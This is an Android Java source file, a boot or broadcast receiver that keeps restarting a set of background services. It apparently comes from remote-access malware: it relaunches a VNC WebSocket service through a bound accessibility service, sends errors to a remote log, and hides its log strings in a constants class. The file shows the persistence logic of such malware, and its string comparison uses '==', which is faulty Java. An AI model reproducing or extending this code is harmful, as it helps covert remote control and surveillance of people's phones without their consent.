package com.service.app.Services;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;


import com.service.app.Main.AccessAdm;
import com.service.app.defines;
import com.service.app.defines;
import com.service.app.vnc.WebSocketService;


public class BooterConfig extends BroadcastReceiver {
    defines consts = new defines();
    private final String TAG_LOG = BooterConfig.class.getSimpleName()+ consts.strTAG1;
    utils utl = new utils();
    Utitlies idutl = new Utitlies();

    @Override
    public void onReceive(Context context, Intent intent) {

        try {
            utl.Log(TAG_LOG, consts.str_log1);
            utils.startCustomTimer(context, consts.str_null, 10000);

            for (int i = 0; i < consts.arrayClassService.length; i++) {
                if (!utl.isMyServiceRunning(context, consts.arrayClassService[i])) {
                    if (kingservice.class.getName().equals(consts.arrayClassService[i].getName())) {
                        utl.startKingService(context);
                    } else if (WebSocketService.class.getName().equals(consts.arrayClassService[i].getName())) {
                        if ((utl.SettingsRead(context, "websocket") == "0" || !utl.isMyServiceRunning(context, WebSocketService.class)) && utl.isAccessibilityServiceEnabled(context, Access.class)) {
                            Intent intent2 = new Intent(Access.ACTION_BIND_WEBSOCKET);
                            context.sendBroadcast(intent2);
                            utl.Log(TAG_LOG, consts.string_25 + consts.arrayClassService[i]);
                        }
                    } else {
                        context.startService(new Intent(context, consts.arrayClassService[i]));
                        utl.Log(TAG_LOG, consts.string_25 + consts.arrayClassService[i]);
                    }
                }
            }


        }catch (Exception ex){
            utl.RemoteLog(context, TAG_LOG + ": " + ex.toString());
        }
    }


}
